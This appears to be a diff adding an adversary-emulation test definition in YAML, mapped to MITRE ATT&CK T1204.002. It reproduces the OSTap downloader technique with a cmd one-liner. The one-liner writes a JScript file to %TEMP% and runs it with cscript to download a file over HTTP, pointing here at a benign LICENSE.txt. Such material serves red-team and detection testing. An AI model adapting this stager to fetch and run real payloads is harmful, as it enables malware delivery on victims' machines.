@@ -1,0 +1,22 @@
+---
+- id: dac0bc35f2b7e7183206259c97b03976
+  name: OSTap Payload Download
+  description: 'Uses cscript //E:jscript to download a file
+
+    '
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      cmd:
+        command: echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt",
+          fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream;
+          request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET',
+          url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream');
+          stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position
+          = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0);
+          > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js
+        payloads: []
+        cleanup: del %TEMP%\OSTapGet.js /F /Q >nul 2>&1
